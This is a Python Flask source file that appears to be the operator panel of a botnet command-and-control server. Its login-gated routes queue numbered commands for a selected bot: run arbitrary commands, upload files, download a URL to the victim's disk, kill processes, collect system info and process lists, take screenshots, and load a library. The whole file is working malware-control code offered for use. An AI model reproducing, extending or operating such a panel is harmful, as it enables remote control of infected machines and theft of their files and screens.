import sqlite3 as sql
from flask import send_from_directory
from flask import g
from flask import request
from flask import render_template
from flask import redirect, url_for
from flask import session

from c2.database import update_bot_record
from c2.app import app
from c2.app import get_db


@app.route('/action/run', methods=['POST'])
def actionrun():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '4 ' + request.form['cmd'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/upload', methods=['POST'])
def actionupload():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '5 ' + request.form['path'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/download', methods=['POST'])
def actiondownload():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '6 ' + request.form['url'] + ' ' + request.form['filepath'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/kill', methods=['POST'])
def actionkill():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '7 ' + request.form['pid'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/info', methods=['POST'])
def actioninfo():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '2')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/ps', methods=['POST'])
def actionps():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '3')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/ss', methods=['POST'])
def actionss():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '8')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'

@app.route('/action/loadlibrary', methods=['POST'])
def actionloadlibrary():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '9 ' + request.form['librarypath'])
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'


@app.route('/action/clear', methods=['POST'])
def clearqueue():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        conn = get_db()
        update_bot_record.update_commandqueue(conn, request.form['id'], '')
        return redirect(url_for('bot', id=request.form['id']))
    return 'Error adding command to database'